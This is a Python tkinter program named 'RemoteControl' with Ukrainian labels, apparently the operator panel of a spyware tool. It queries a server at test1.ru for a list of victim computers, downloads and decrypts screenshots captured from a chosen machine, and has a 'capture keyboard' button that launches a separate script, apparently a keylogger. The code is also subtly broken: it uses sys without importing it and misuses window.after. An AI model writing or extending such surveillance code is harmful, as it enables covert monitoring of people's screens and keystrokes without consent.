from tkinter import *
import io
import time
import requests
import subprocess
import pyAesCrypt
from functools import update_wrapper, partial
import multiprocessing
from multiprocessing import Pool,Process,Queue,Lock
bufferSize=64*1024
password=''
hosts=''
lock=Lock()
URL='http://test1.ru'
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
}
def MemoryCrypter(path,is_encrypted,password):
    if "win" in sys.platform:
        subprocess.check_output(f'attrib -h -s {path}', shell=True) 
    sequence_bytes = io.BytesIO()
    with open(path,"rb") as f:
        file_content=io.BytesIO(f.read())
		
    with open(path,"wb") as f:
        if is_encrypted:
            pyAesCrypt.encryptStream(file_content,sequence_bytes,password,bufferSize)
        else:
            pyAesCrypt.decryptStream(file_content,sequence_bytes,password,bufferSize,len(file_content.getvalue()))
        f.write(sequence_bytes.getvalue())
SCREENFILE=''
screenshoturl=''
flg=False
def update_clock(res):
    global URL
    global SCREENFILE
    global screenshoturl
    global flg
    while flg==True:
        time.sleep(1)
        print(flg)
    flg=True
    with open(SCREENFILE, 'wb') as handle:
        response = requests.get(screenshoturl, stream=True)
        hdrs=response.headers
        print(f"Content-Type {hdrs['Content-Type']}")
        if not response.ok:
            print("ok")
        for block in response.iter_content(1024):
         if not block:
             break
         handle.write(block) 
    try:
        MemoryCrypter(SCREENFILE,0,res)
        photo=PhotoImage(file=f'.\{SCREENFILE}')
        rLabel.image=photo
        rLabel.photo_ref =photo
        rLabel.config(image=photo)
        rLabel["image"]=photo 
        flg=False
    except ValueError:
        print('Wrong pass')

def click2():
    try:
        cmd=".\kybrd.py"
        subprocess.check_output(cmd, shell=True)
    except OSError:
        print('OSError')
        
def click():
    global URL
    global flg
    global SCREENFILE
    global screenshoturl
    global hosts
    res=entry_box.get()
    print(res)
    if res=='' or res not in hosts:
        window.title('Ви ввели не дійсне ім\'я комп\'ютера ')
        return
    SCREENFILE=f"{res}_screenshot.png"
    screenshoturl=f"{URL}/COMPNAME_{res}uploaddir/screenshots/newpng.png"
    print(screenshoturl)
    flg=False
    window.after(1000, update_clock(res))
    window.after(1000, click)   
    
if __name__ == '__main__':
    window = Tk()
    window.title("RemoteControl")
    window.geometry("1000x1000")
    URL="http://test1.ru"
    session = requests.Session()
    post_request = session.post('http://test1.ru/getComputers.php', {
         'key': 'SD4q5'
    })
    res=[]
    if post_request.status_code==200:
        res=post_request.text
        res=' '+res
        res=res.replace(' COMPNAME_',' ')
        res=res.replace(' ','\n')
        print(res)  
    hosts=res
    label = Label(text = f"Введіть назву комп\'ютера:\n{res}")
    label.place(x = 0, y = 0, width = 220, height = 155)
    entry_box = Entry (text = f"Назва компу {res}")
    entry_box.place(x = 250, y = 20, width = 140, height = 65)
    button1 = Button(text = "Показати\nскріншот", command = click)
    button1.place(x = 600, y = 10, width = 100, height = 35)
    
    button1 = Button(text = "Захопити клавіатуру", command = click2)
    button1.place(x = 700, y = 10, width = 130, height = 35)    

    photo=PhotoImage(file='.\password.png')
    rLabel = Label(window,image = photo)
    rLabel.place(x = 0, y = 120, width = 1350, height = 900)
        
    window.mainloop()	
